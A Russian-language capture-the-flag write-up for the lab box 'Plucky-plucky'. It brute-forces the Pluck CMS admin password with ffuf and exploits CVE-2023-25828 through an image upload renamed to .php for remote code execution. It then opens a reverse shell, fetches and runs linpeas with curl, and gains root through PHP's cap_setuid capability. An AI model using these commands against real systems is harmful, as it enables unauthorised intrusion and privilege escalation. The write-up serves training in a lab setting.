# Plucky-plucky

## Описание:
| Название | Сложность | Автор |
|------|-----|-------|
| Plucky-plucky | легкий | @collapsz |
## TLDR:

**CVE-2023-25828** в Pluck CMS, повышение привилегий через Linux Capabilities 

---
## Решение:
На веб-интерфейсе нас встречает система управления контентом Pluck CMS:

![image](https://github.com/user-attachments/assets/e0e55c6d-7d97-4b33-a093-3224ae450d6f)

Версия которой шустро узнается при помощи, например, `whatweb`:

![image](https://github.com/user-attachments/assets/944d573a-3d5a-4e4f-870d-3f35f9de98a8)

Шустрый ресерч подскажет нам вектор развития атаки: 

![image](https://github.com/user-attachments/assets/746eaaa0-3a23-4d05-aade-7d62523cc7ef)

Уязвимость в одном из модулей обработки изображений, однако она является `Authenticated`, значит нам нужно авторизоваться.
Пароль нам неизвестен, поэтому `ffuf` в помощь:

```
ffuf -u 'http://plucky.rdg/login.php' -d 'cont1=FUZZ&bogus=&submit=Log+in' -w /usr/share/wordlists/rockyou.txt
```
Узнаем пароль админа – `plucky12`, авторизуемся с ним и попадаем в админку. Дальше все как описано в CVE. 

Воспользуемся [Jellypeg](https://github.com/jra89/Jellypeg) для генерации полезной нагрузки, предварительно немного подредактировав скрипт и указав URL на существующее изображение:

![image](https://github.com/user-attachments/assets/83dd2bd6-41e5-4db4-b8c3-90ec7e235290)

Грузим нашу картинку (важно, чтобы расширение легитимное):

![image](https://github.com/user-attachments/assets/e2bfce84-411b-4087-adb6-40cbcb99c15d)

Перехватываем запрос и в конец `filename` приписываем `.php`:
![image](https://github.com/user-attachments/assets/8ab880be-da2e-4186-8e14-abe4e4dabb3b)
![image](https://github.com/user-attachments/assets/7aa4b376-d9a9-4ff5-8cf3-a2c04f940502)

"Картинка" успешно загружена:

![image](https://github.com/user-attachments/assets/0990688f-4e01-450a-922d-34ed4d90c24a)

А на ручке `/images/image.jpg.php?c=id` нас уже ожидает RCE:

![image](https://github.com/user-attachments/assets/9e8a7a38-f857-4ec6-81b7-db9142fa6296)

Пробрасываем себе реверс-шелл любым удобным способом:
![image](https://github.com/user-attachments/assets/87c8ca09-2378-400c-9edf-ff7412482e57)

Для удобного перечисления ресурсов системы воспользуемся Linpeas:

```
curl https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lin.sh && chmod +x /tmp/lin.sh && /tmp/lin.sh
```
Находим следующее:
```
www-data@c7e915851f7d:/var/www/html# getcap $(which php8.1)
/usr/bin/php8.1 cap_setuid=ep
```
Повышаемся [всем известный ресурс в помощь](https://gtfobins.github.io/gtfobins/php/):
```
CMD="/bin/sh"
$(which php8.1) -r "posix_setuid(0); system('$CMD');"
id
uid=0(root)
```
## Flag:
RDG{c63402a45aad5057636a6c456e1617ef}
